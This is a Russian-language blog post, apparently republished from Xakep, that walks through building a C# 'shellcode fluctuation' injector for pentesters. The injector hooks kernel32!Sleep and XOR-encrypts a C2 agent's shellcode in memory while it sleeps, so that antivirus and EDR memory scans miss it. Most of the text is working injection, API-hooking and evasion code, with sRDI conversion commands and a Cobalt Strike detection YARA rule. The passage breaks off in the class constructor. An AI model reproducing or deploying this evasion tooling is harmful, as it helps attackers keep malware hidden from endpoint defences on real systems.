---
layout: post
title: "Флуктуация шелл-кода. Пишем инжектор для динамического шифрования полезной нагрузки в памяти"
date: 2022-08-07 16:00:00 +0300
author: snovvcrash
tags: [xakepru, maldev, c2, covenant, memory-evasion, shellcode-injection, shellcode-fluctuation, api-hooking, dotnet, csharp]
---

[//]: # (2022-06-17)

Сегодня поговорим об одной из продвинутых техник уклонения от средств защиты при использовании фреймворков Command & Control – динамическом сокрытии шеллкода в памяти ожидающего процесса. Я соберу PoC из доступного на гитхабе кода и применю его к опенсорсным фреймворкам. Если взглянуть на список фич, которыми хвастаются все коммерческие фреймворки C2 стоимостью 100500 долларов в час (Cobalt Strike, Nighthawk, Brute Ratel C4), первой в этих списках значится, как правило, возможность уклонения от сканирования памяти запущенных процессов на предмет наличия сигнатур агентов этих самых C2. Что если попробовать воссоздать эту функцию самостоятельно? В статье я покажу, как я это сделал. Итак что же это за зверь такой, этот флуктуирующий шеллкод?

<!--cut-->

<p align="right">
    <a href="https://xakep.ru/2022/06/17/shellcode-fluctuation/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
</p>

![banner.png](/assets/images/shellcode-fluctuation/banner.png)
{:.center-image}

* TOC
{:toc}

# Проблематика

В основном мой хлеб – это внутренние пентесты, а на внутренних пентестах бывает удобно (хотя и совсем не необходимо) пользоваться фреймворками C2. Представь такую ситуацию: ты разломал рабочую станцию пользователя, имеешь к ней админский доступ, но ворваться туда по RDP нельзя, ведь нарушать бизнес-процессы заказчика (то есть выбивать сотрудника из его сессии, где он усердно заполняет ячейки в очень важной накладной), «западло».

Одно из решений при работе в Linux – квазиинтерактивные шеллы вроде [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py), [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), [dcomexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py), [scshell.py](https://github.com/Mr-Un1k0d3r/SCShell/blob/master/scshell.py) и [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). Но, во-первых, это чертовски неудобно, во-вторых, ты потенциально сталкиваешься с проблемой double-hop аутентификации (как, например, с Evil-WinRM), а в-третьих и далее – ты не можешь пользоваться объективно полезными фичами C2, как например, исполнение .NET из памяти, поднятие прокси через скомпрометированную тачку и тому подобное.

Если не рассматривать совсем уж инвазимные подходы типа патчинга RDP при помощи Mimikatz (AKA [`ts::multirdp`](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz#ts)), остается работа из агента С2. И вот здесь ты столкнешься с проблемой байпаса средств защиты. Спойлер: по моему опыту в 2022-м при активности любого «увожаемого» антивируса или EDR на хосте твой агент C2, которого ты так долго пытался получить (и все же получил, закриптовав нагрузку мильён раз), проживет в лучшем случае не больше часа.

Всему виной – банальное сканирование памяти запущенных процессов антивирусами, которое выполняется по расписанию с целью поиска сигнатуры известных зловредов. Еще раз: **получить** агента с активным AV (и даже немного из него поработать) – нетрудно; сделать так, чтобы этот агент **прожил хотя бы сутки** на машине жертве — <strike>бесценно</strike> уже сложнее, потому что как бы ты ни криптовал и ни энкодил бинарь, PowerShell-стейжер или шеллкод агента, вредоносные инструкции все равно окажутся в памяти в открытом виде, вследствие чего станут легкой добычей для простого сигнатурного сканера.

Если тебя спалят с вредоносом в системной памяти, который не подкреплен подозрительным бинарем на диске (например, когда имела место инъекция шеллкода в процесс), тот же Kaspersky Endpoint Security при дефолтных настройках не определит, какой именно процесс заражен и в качестве решения **настойчиво** предложит тебе перезагрузить машину.

[![kes-detection.png](/assets/images/shellcode-fluctuation/kes-detection.png)](/assets/images/shellcode-fluctuation/kes-detection.png)
{:.center-image}

Да-да, мы поняли
{:.quote}

Такое поведение вызывает еще большее негодование для пентестера, потому что испуганный пользователь сразу побежит жаловаться в IT или к безопасникам.

Есть два пути решения этой проблемы:

1. Использовать C2-фреймворки, которые еще не успели намазолить глаза блютимерам, и чьи агенты еще не попали в список легкодетектируемых. Другими словами, писать свое, искать малопопулярные решения на гитхабе с учетом региональных особенностей AV, который ты собрался байпасить, и тому подобное.
2. Прибегнуть к продвинутым техникам сокрытия индикаторов компрометации после запуска агента C2. Например, подчищать аномалии памяти после запуска потоков, использовать связку «неисполняемая память + ROP-гаджеты» для размещения агента и его функционирования, шифровать нагрузку в памяти, когда взаимодействие с агентом не требуется.

В этой статье мы на примере посмотрим, как вооружить простой PoC флуктуирующего шеллкода (комбинация третьего и частично второго пункта из абзаца выше) для его использования с почти любым опенсорсным фреймворком C2. Но для начала немного экскурса в историю.

# A long time ago in a galaxy far, far away...

## Флипы памяти RX → RW / NA

Первым опенсорсным проектом, предлагающим PoC-решение для уклонения от сканирования памяти, о котором я узнал, был [gargoyle](https://github.com/JLospinoso/gargoyle).

Если не углубляться в реализацию, его главная идея заключается в том, что полезная нагрузка (исполняемый код) размещается в **не**исполняемой области памяти (`PAGE_READWRITE` или `PAGE_NOACCESS`), которую не станет сканировать антивирус или EDR. Предварительно загрузчик gargoyle формирует специальный ROP-гаджет, который выстрелит по таймеру и изменит стек вызовов таким образом, чтобы верхушка стека оказалась на API-хендле `VirtualProtectEx` – это позволит нам изменить маркировку защиты памяти на `PAGE_EXECUTE_READ` (то есть сделать память исполняемой). Дальше полезная нагрузка отработает, снова передаст управление загрузчику gargoyle, и процесс повторится.

[![gargoyle.png](/assets/images/shellcode-fluctuation/gargoyle.png)](/assets/images/shellcode-fluctuation/gargoyle.png)
{:.center-image}

Механизм работы gargoyle (изображение – lospi.net)
{:.quote}

Принцип работы gargoyle много раз дополнили, улучшили и «переизобрели». Вот несколько примеров:

- [Bypassing Memory Scanners with Cobalt Strike and Gargoyle](https://labs.f-secure.com/blog/experimenting-bypassing-memory-scanners-with-cobalt-strike-and-gargoyle/)
- [Bypassing PESieve and Moneta (The "easy" way....?)](https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/)
- [A variant of Gargoyle for x64 to hide memory artifacts using ROP only and PIC](https://github.com/thefLink/DeepSleep)

Также интересный подход продемонстрировали в F-Secure Labs, реализовав расширение [Ninjasploit](https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/) для Meterpreter, которое по косвенным признакам определяет, что Windows Defender вот-вот запустит процедуру сканирования, и тогда «флипает» область памяти с агентом на неисполняемую прямо перед этим. Сейчас, скорее всего, это расширение уже не «взлетит», так как и Meterpreter и «Дефендер» обновились не по одному разу, но идея все равно показательна.

Из этого пункта мы заберем с собой главную идею: изменение маркировки защиты памяти помогает скрыть факт ее заражения.

[![droids-meme.png](/assets/images/shellcode-fluctuation/droids-meme.png)](/assets/images/shellcode-fluctuation/droids-meme.png)
{:.center-image}

Вот, что на самом деле происходит под капотом этой техники
{:.quote}

## Cobalt Strike: Obfuscate and Sleep

В далеком 2018 году [вышла](https://www.cobaltstrike.com/blog/cobalt-strike-3-12-blink-and-youll-miss-it/) версия 3.12 культовой C2-платформы Cobalt Strike. Релиз назывался «Blink and you’ll miss it», что как бы намекает на главную фичу новой версии – директиву `sleep_mask`, в которой реализована концепция **obfuscate-and-sleep**.

Эта концепция включает в себя следующий алгоритм поведения бикона:

1. Если маячок «спит», то есть бездействует, выполняя `kernel32!Sleep` и ожидая команды от оператора, содержимое исполняемого (RWX) сегмента памяти полезной нагрузки обфусцируется. Это мешает сигнатурным сканерам распознать в нем `Behavior:Win32/CobaltStrike` или похожую бяку.
2. Если маячку поступает на исполнение следующая команда из очереди, содержимое исполняемого сегмента памяти полезной нагрузки **де**обфусцируется, команда выполняется, и подозрительное содержимое маяка обратно обфусцируется, превращаясь в неразборичивый цифровой мусор на радость оператору «Кобы» и на зло бдящему антивирусу.

Эти действия проходят прозрачно для оператора, а процесс обфускации представляет собой обычный XOR исполняемой области памяти с фиксированным размером ключа 13 байт (для версий CS от 3.12 до 4.3).

Продемонстрируем это на примере. Я возьму [этот](https://gist.github.com/tothi/8abd2de8f4948af57aa2d027f9e59efe) профиль для CS, написанный [@an0n_r0](https://twitter.com/an0n_r0) как PoC минимально необходмого профиля Malleable C2 для обхода «Дефендера». Опция `set sleep_mask "true"` активирует процесс `obfuscate-and-sleep`.

[![cs-set-sleep-mask.png](/assets/images/shellcode-fluctuation/cs-set-sleep-mask.png)](/assets/images/shellcode-fluctuation/cs-set-sleep-mask.png)
{:.center-image}

Получили маячок
{:.quote}

Далее с помощью Process Hacker найдем в бинаре «Кобы» сегмент RWX-памяти (при заданных настройках профиля он будет один) и посмотрим его содержимое.

[![process-hacker-beacon-obfuscated.png](/assets/images/shellcode-fluctuation/process-hacker-beacon-obfuscated.png)](/assets/images/shellcode-fluctuation/process-hacker-beacon-obfuscated.png)
{:.center-image}

Цифровой мусор или?..
{:.quote}

На первый взгляд, и правда, выглядит как ничего не значащий набор байтов. Но если установить интерактивный режим маячка командой `sleep 0` и «поклацать» несколько раз на Re-read в PH, нам откроется истина.

[![process-hacker-beacon-re-read.gif](/assets/images/shellcode-fluctuation/process-hacker-beacon-re-read.gif)](/assets/images/shellcode-fluctuation/process-hacker-beacon-re-read.gif)
{:.center-image}

Маски прочь!
{:.quote}

[![process-hacker-beacon-deobfuscated.png](/assets/images/shellcode-fluctuation/process-hacker-beacon-deobfuscated.png)](/assets/images/shellcode-fluctuation/process-hacker-beacon-deobfuscated.png)
{:.center-image}

Деобфусцированная нагрузка маячка
{:.quote}

Возможно, это содержимое все еще не очень информативно (сама нагрузка чуть дальше в памяти стаба), но если пересоздать бикон без использование профиля, можно увидеть сердце маячка в чистом виде.

[![beacon-no-sleep-mask.png](/assets/images/shellcode-fluctuation/beacon-no-sleep-mask.png)](/assets/images/shellcode-fluctuation/beacon-no-sleep-mask.png)
{:.center-image}

PURE EVIL
{:.quote}

Однако на любое действие есть противодействие (или наоборот), поэтому люди из Elastic, не долго думая, [запилили](https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures) YARA-правило для обнаружения повторяющихся паттернов, «заксоренных» на одном и том же ключе:

```
rule cobaltstrike_beacon_4_2_decrypt
{
meta:
    author = "Elastic"
    description = "Identifies deobfuscation routine used in Cobalt Strike Beacon DLL version 4.2."
strings:
    $a_x64 = {4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 75 05 45 85 DB 74 33 45 3B CB 73 E6 49 8B F9 4C 8B 03}
    $a_x86 = {8B 46 04 8B 08 8B 50 04 83 C0 08 89 55 08 89 45 0C 85 C9 75 04 85 D2 74 23 3B CA 73 E6 8B 06 8D 3C 08 33 D2}
condition:
     any of them
}
```

В следующих актах этой оперы началась классическая игра в кошки-мышки между нападающими и защищающимися. В HelpSystems [выпустили](https://www.cobaltstrike.com/blog/sleep-mask-update-in-cobalt-strike-4-5/) отдельный [Sleep Mask Kit](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/artifacts-antivirus_sleep-mask-kit.htm) для того, чтобы оператор мог изменять длину маски самостоятельно, но это уже совсем другая история...

В статье [Sleeping with a Mask On](https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/) можно увидеть, как модификация длины ключа XOR влияет на детектирование пейлоада CS в памяти.

Но довольно истории, пора подумать, как сделать эту технику «ближе к народу», и реализовать подобное в опенсорсном инструментарии.

# Флуктуация шеллкода на GitHub

Два невероятно крутых проекта на просторах GitHub, которые еще давно привлекли мое внимание – это [SleepyCrypt](https://github.com/SolomonSklash/SleepyCrypt) авторства [@SolomonSklash](https://twitter.com/SolomonSklash) (который идет вместе [с пояснительной запиской](https://www.solomonsklash.io/SleepyCrypt-shellcode-to-encrypt-a-running-image.html)) и [ShellcodeFluctuation](https://github.com/mgeeky/ShellcodeFluctuation), созданный [@mariuszbit](https://twitter.com/mariuszbit), у которого я позаимствовал название для этой статьи. Ни в коем случае не претендую на авторство, просто мне кажется, что слова «флуктуирующий шеллкод» отлично годится для наименования этого семейства техник в целом.

SleepyCrypt — это PoC, который можно вооружить при создании собственного C2-фреймворка (на выходе имеем позиционно-независимый шеллкод, сам себя шифрующий и расшифровывающий), а ShellcodeFluctuation – «самодостаточный» инжектор, который можно использовать с готовым шеллкодом существующего C2. К последнему мы будем стремиться при написании чего-то подобного на С#, а пока разберем, как устроен ShellcodeFluctuation.

## ShellcodeFluctuation

Самое важное для нас — понять, как реализуется перехват управления к обычному Sleep (который `kernel32!Sleep`) и переопределяется его поведение на «шифровать, поспать, расшифровать». Как ты уже мог понять, мы будем говорить об основах техники Inline API Hooking (MITRE ATT&CK [T1617](https://attack.mitre.org/techniques/T1617/)).

Хороший базовый пример реализации хукинга (как и многих других техник малдева) есть на [Red Teaming Experiments](https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++), но мы разберем упрощенный пример на основе самого ShellcodeFluctuation, чтобы быть готовым к его портированию на C#. Вместо Sleep пока будем хукать функцию `kernel32!MessageBoxA` для более наглядного демонстрации результата.

В сущности, нас интересуют две функции, ответственные за перехват `MessageBoxA`.

### fastTrampoline

Функция `fastTrampoline` выполняет запись ассемблерных инструкций (именуемых «трамплином») по адресу расположения функции `MessageBoxA` библиотеки kernel32.dll. Она уже загружена в память целевого процесса, куда будет внедрен шеллкод (в нашем случае мы ориентируемся на self-инъекцию, поэтому патчить kernel32.dll будем в текущем процессе). В момент установки хука инжектор перезаписывает начало инструкций `MessageBoxA` трамплином, содержащим безусловный «джамп» на нашу собственную реализацию `MessageBoxA` (`MyMessageBoxA`). В процессе снятия хука (за это тоже ответственна функция `fastTrampoline`), трамплин перезаписывается оригинальными байтами из начала функции `MessageBoxA`, которые предварительно были сохранены во временный буфер.

Содержимое трамплина — это две простые ассемблерные инструкции (записать адрес переопределенной функции в регистр и выполнить jmp), ассемблированные в машинный код и записанные в массив байт в формате little-endian.

Результат сборки с [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly):

```
{ 0x49, 0xBA, 0x37, 0x13, 0xD3, 0xC0, 0x4D, 0xD3, 0x37, 0x13, 0x41, 0xFF, 0xE2 }

Disassembly:

0:  49 ba 37 13 d3 c0 4d    movabs r10,0x1337d34dc0d31337
7:  d3 37 13
a:  41 ff e2                jmp    r10
```

А вот и сам код:

```cpp
// https://github.com/mgeeky/ShellcodeFluctuation/blob/cb7a803493b9ce9fb5a5a3bc1c77773a60194ca4/ShellcodeFluctuation/main.cpp#L178-L262
bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers)
{
    // Шаблон нашего трамплина с 8 нулевыми байтами, выполняющими роль заглушки под джамп-адрес
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    // Патчим трамплин байтами джамп-адреса
    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook) // если в режиме установки хука
    {
        if (buffers != NULL)
            // Сохраняем во временный буфер то, что мы собираемся перезаписать трамплином
            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);

        // Разрешаем себе изменять память по addressToHook
        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt))
        {
            // Устанавливаем наш хук (просто копируем его содержимое в нужное место)
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else // если в режиме снятия хука
    {
        dwSize = buffers->originalBytesSize;

        // Так же разрешаем себе изменять память по addressToHook
        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt))
        {
            // Восстанавливаем то, что было там изначально (до записи трамплина)
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    // Возвращаем маркировку защиты памяти в первоначальное состояние
    ::VirtualProtect(
        addressToHook,
        dwSize,
        oldProt,
        &oldProt
    );

    return output;
}
```

### MyMessageBoxA

`MyMessageBoxA` – наша функция, переопределяющая поведение оригинального `MessageBoxA`, адрес которой будет записан в шаблон трамплина, и на которую мы «прыгнем» при легитимном вызове `MessageBoxA`.

В качестве демонстрации мы вызовем `MessageBoxA` с одним сообщением, а модальное окно отрисует совсем другое.

```cpp
// https://github.com/mgeeky/ShellcodeFluctuation/blob/cb7a803493b9ce9fb5a5a3bc1c77773a60194ca4/ShellcodeFluctuation/main.cpp#L11-L65
void WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.originalBytes = g_hookedMessageBoxA.msgboxStub;
    buffers.originalBytesSize = sizeof(g_hookedMessageBoxA.msgboxStub);

    // Снимаем хук, чтобы далее вызвать оригинальную функцию MessageBoxA
    fastTrampoline(false, (BYTE*)::MessageBoxA, (void*)&MyMessageBoxA, &buffers);

    ::MessageBoxA(NULL, "You've been pwned!", "][AKEP", MB_OK);

    // Снова вешаем хук
    fastTrampoline(true, (BYTE*)::MessageBoxA, (void*)&MyMessageBoxA, NULL);
}
```

### Результат

Полагаю, что здесь все ясно без лишний объяснений.

[![hooked-messagebox.png](/assets/images/shellcode-fluctuation/hooked-messagebox.png)](/assets/images/shellcode-fluctuation/hooked-messagebox.png)
{:.center-image}

API Hokking функции MessageBoxA
{:.quote}

# Пилим свой флуктуатор на С#

Идея реализации этой техники на C# пришла ко мне после [твита](https://twitter.com/_RastaMouse/status/1443923456630968320) [@_RastaMouse](https://twitter.com/_RastaMouse), где он использовал библиотеку [MinHook.NET](https://github.com/CCob/MinHook.NET) для PoC-флуктуатора.

[![rastamouse-poc-twitter.png](/assets/images/shellcode-fluctuation/rastamouse-poc-twitter.png)](/assets/images/shellcode-fluctuation/rastamouse-poc-twitter.png)
{:.center-image}

PoC от @\_RastaMouse (изображение – twitter.com)
{:.quote}

Что ж, мы можем попробовать сделать что-то подобное, но без тяжеловесной зависимости в виде MinHook.NET, которую не хотелось бы включать в инжектор. Так как я планирую запускать финальный код из памяти через PowerShell, лишнее беспокойство AMSI вызывать ни к чему.

Так как объяснять, как ты писал код, в тексте статьи всегда непросто, поступим так: сперва наметим такой же каркас программы, как на скриншоте выше, а затем реализуем недостоющую логику.

## Прототипирование

Итак, вот что у меня получилось в качестве наброса схематичного кода:

```cs
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace FluctuateInjector
{
    class Program
    {
        // Классическая инъекция шеллкода в текущий процесс
        static void Main(string[] args)
        {
            var shellcodeBytes = File.ReadAllBytes(@"C:\Users\snovvcrash\Desktop\dllSleep.bin");
            var shellcodeLength = shellcodeBytes.Length;

            // Выделяем область памяти в адресном пространстве текущего процесса инжектора (0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE)
            var shellcodeAddress = Win32.VirtualAlloc(IntPtr.Zero, (IntPtr)shellcodeLength, 0x3000, 0x04);
            // и копируем туда байты шеллкода
            Marshal.Copy(shellcodeBytes, 0, shellcodeAddress, shellcodeLength);

            // Репротект памяти после записи шеллкода (0x20 = PAGE_EXECUTE_READ)
            Win32.VirtualProtect(shellcodeAddress, (uint)shellcodeLength, 0x20, out _);

            // Хукаем Sleep
            var fs = new FluctuateShellcode(shellcodeAddress, shellcodeLength);
            fs.EnableHook();

            // Начинаем исполнение шеллкода созданием нового потока
            var hThread = Win32.CreateThread(IntPtr.Zero, 0, shellcodeAddress, IntPtr.Zero, 0, IntPtr.Zero);
            Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Снимаем хук
            fs.DisableHook();
        }
    }

    class FluctuateShellcode
    {
        delegate void Sleep(uint dwMilliseconds);
        readonly Sleep sleepOrig;
        readonly GCHandle gchSleepDetour;

        readonly IntPtr sleepOriginAddress, sleepDetourAddress;
        readonly byte[] sleepOriginBytes = new byte[16], sleepDetourBytes;

        readonly byte[] trampoline =
        {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
            0x41, 0xFF, 0xE2                                            // jmp r10
        };

        readonly IntPtr shellcodeAddress;
        readonly int shellcodeLength;
        readonly byte[] xorKey;

        public FluctuateShellcode(IntPtr shellcodeAddr, int shellcodeLen)
        { }

        ~FluctuateShellcode()
        { }

        // Наш переопределнный Sleep
        void SleepDetour(uint dwMilliseconds)
        { }

        // Установка хука
        public bool EnableHook()
        { }

        // Снятие хука
        public bool DisableHook()
        { }

        // Функция, отвечающая за флипы памяти на RW / NA
        void ProtectMemory(uint newProtect)
        { }

        // Обфуская памяти шеллкода простым XOR-шифрованием
        void XorMemory()
        { }

        // Генерация ключа для XOR-шифрования
        byte[] GenerateXorKey()
        { }
    }

    // Необходимый набор Win32 API
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        
        [DllImport("kernel32.dll")]
        public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);
    }
}
```

Вроде, пока все более-менее прозрачно. Единственное, что надо уточнить – это какой шеллкод мы возьмем в процессе тестирования.

Все просто: скомпилируем DLL из дефолтных пресетов Visual Studio с единственной выполняемой операцией – `Sleep` на 5 секунд, и превратим ее в шеллкод.

sRDI (Shellcode Reflective DLL Injection) – логическое продолжение техник [RDI](https://github.com/stephenfewer/ReflectiveDLLInjection) и [Improved RDI](https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html), позволяющее генерировать позиционно-независимый шеллкод из библиотеки DLL:

- [sRDI – Shellcode Reflective DLL Injection - NetSPI](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/)
- [monoxgas/sRDI: Shellcode implementation of Reflective DLL Injection. Convert DLLs to position independent shellcode](https://github.com/monoxgas/sRDI)

Для этого понадобится код самой DLL:

```cpp
// dllSleep.cpp
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        while (TRUE) { Sleep(5000); }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

И [генератор](https://github.com/monoxgas/sRDI/blob/master/Python/ConvertToShellcode.py) шеллкода из DLL:

```
PS > curl https://github.com/monoxgas/sRDI/raw/master/Python/ShellcodeRDI.py -o ShellcodeRDI.py
PS > curl https://github.com/monoxgas/sRDI/raw/master/Python/ConvertToShellcode.py -o ConvertToShellcode.py
PS > python ConvertToShellcode.py -i dllSleep.dll
Creating Shellcode: dllSleep.bin
```

Шеллкод для тестов у нас готов. Не переживай, как только закончим с инжектором, протестим все на боевом C2.

## Реализация

Каркас инжектора есть, дело за малым – наполнить методы класса `FluctuateShellcode` смысловой нагрузкой. Будем идти по нашей «рыбе» снизу вверх.

### FluctuateShellcode.GenerateXorKey

Здесь все очевидно – сгенерируем последовательность байтов, которая будет накладываться на байты шеллкода [как шифрующая гамма](https://ru.wikipedia.org/wiki/Гаммирование). Помня о несовершенстве первой версии техники Obfuscate and Sleep в Cobalt Strike, из-за которой присутствие бикона можно было распознать YARA-правилом, основываясь на длине повторяющегося ключа, я реализую шифрование XOR в режиме [одноразового блокнота](https://ru.wikipedia.org/wiki/Шифр_Вернама). В этом случае размер ключа равен размеру шифротекста, то есть длине шеллкода (благо, шеллкоды обычно небольшие, поэтому «лагов» и «фризов» быть не должно).

```cs
byte[] GenerateXorKey()
{
    Random rnd = new Random();
    byte[] xorKey = new byte[shellcodeLength];
    rnd.NextBytes(xorKey);
    return xorKey;
}
```

### FluctuateShellcode.XorMemory

Пока тоже вроде нетрудно: накладываем шифрующую гамму на сегмент памяти, содержащий байты шеллкода.

```cs
void XorMemory()
{
    byte[] data = new byte[shellcodeLength];
    Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);
    for (var i = 0; i < data.Length; i++) data[i] ^= xorKey[i];
    Marshal.Copy(data, 0, shellcodeAddress, data.Length);
}
```

### FluctuateShellcode.ProtectMemory

В реализации этой функции выбор остается за читателем: либо используй VirtualProtect из Win32 API с помощью [P/Invoke](http://www.pinvoke.net/default.aspx/kernel32/VirtualProtect.html), либо <strike>если хочешь быть самым крутым хакером</strike> используй [D/Invoke](https://thewover.github.io/Dynamic-Invoke/) и системные вызовы, как мы делали это, [когда модернизировали KeeThief](https://xakep.ru/2022/03/31/keethief/).

Пример с P/Invoke:

```cs
void ProtectMemory(uint newProtect)
{
    if (Win32.VirtualProtect(shellcodeAddress, (uint)shellcodeLength, newProtect, out _))
        Console.WriteLine("(FluctuateShellcode) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + $" to {newProtect}");
    else
        throw new Exception("(FluctuateShellcode) [-] VirtualProtect");
}
```

Пример с D/Invoke:

```cs
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate DoItDynamicallyBabe.Native.NTSTATUS NtProtectVirtualMemory(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref IntPtr RegionSize,
    uint NewProtect,
    ref uint OldProtect);

void ProtectMemory(uint newProtect)
{
    IntPtr stub = GetSyscallStub("NtProtectVirtualMemory");
    NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
    IntPtr protectAddress = shellcodeAddress;
    IntPtr regionSize = (IntPtr)shellcodeLength;
    uint oldProtect = 0;

    var result = ntProtectVirtualMemory(
        Process.GetCurrentProcess().Handle,
        ref protectAddress,
        ref regionSize,
        newProtect,
        ref oldProtect);

    if (ntstatus == NTSTATUS.Success)
        Console.WriteLine("(FluctuateShellcode) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + $" to {newProtect}");
    else
        throw new Exception($"(FluctuateShellcode) [-] NtProtectVirtualMemory: {ntstatus}");
}
```

### FluctuateShellcode.DisableHook

Функция снятия хука – то есть перезапись трамплина содержимым оригинального `Sleep`, которое мы бережно храним в поле `sleepOriginBytes`. И снова можно использовать как P/Invoke, так и более модный D/Invoke для работы с API.

```cs
public bool DisableHook()
{
    bool unhooked = false;
    if (Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)sleepOriginBytes.Length,
        0x40, // 0x40 = PAGE_EXECUTE_READWRITE
        out uint oldProtect))
    {
        Marshal.Copy(sleepOriginBytes, 0, sleepOriginAddress, sleepOriginBytes.Length);
        unhooked = true;
    }

    bool flushed = false;
    if (Win32.FlushInstructionCache(
        Process.GetCurrentProcess().Handle,
        sleepOriginAddress,
        (uint)sleepOriginBytes.Length))
    {
        flushed = true;
    }

    Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)sleepOriginBytes.Length,
        oldProtect,
        out _);

    return unhooked && flushed;
}
```

Если мы изменяем код, уже загруженный в память, Microsoft говорит, что мы должны использовать функцию [FlushInstructionCache](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-flushinstructioncache) – в противном случае кеш ЦП может помешать ОС увидеть изменения.

### FluctuateShellcode.EnableHook

То же самое, как и `DisableHook`, только в этот раз мы перезаписываем исходный `Sleep` трамплином:

```cs
public bool EnableHook()
{
    bool hooked = false;
    if (Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)trampoline.Length,
        0x40, // 0x40 = PAGE_EXECUTE_READWRITE
        out uint oldProtect))
    {
        Marshal.Copy(trampoline, 0, sleepOriginAddress, trampoline.Length);
        hooked = true;
    }

    bool flushed = false;
    if (Win32.FlushInstructionCache(
        Process.GetCurrentProcess().Handle,
        sleepOriginAddress,
        (uint)trampoline.Length))
    {
        flushed = true;
    }

    Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)trampoline.Length,
        oldProtect,
        out _);

    return hooked && flushed;
}
```

### FluctuateShellcode.SleepDetour

Сердце нашей флуктуации — измененная функция `Sleep`, которая будет перехватывать управление в момент «засыпания» агента. По содержимому тела функции понятно, что она делает.

```cs
void SleepDetour(uint dwMilliseconds)
{
    DisableHook();
    ProtectMemory(0x04); // 0x04 = PAGE_READWRITE
    XorMemory();

    sleepOrig(dwMilliseconds);

    XorMemory();
    ProtectMemory(0x20); // 0x20 = PAGE_EXECUTE_READ
    EnableHook();
}
```

### Конструктор и деструктор

Так как мы решили пользоваться преимуществами ООП в C#, в конструкторе мы реализуем вычисление необходимых адресов и содержимого, находящегося по этим адресам:

```cs
public FluctuateShellcode(IntPtr shellcodeAddr, int shellcodeLen)
{
    // Получаем адрес оригинальной функции Sleep
    sleepOriginAddress = Win32.GetProcAddress(Win32.LoadLibrary("kernel32.dll"), "Sleep");
    // Инициализируем делегат для возможности обращения к этой функции по ее адресу
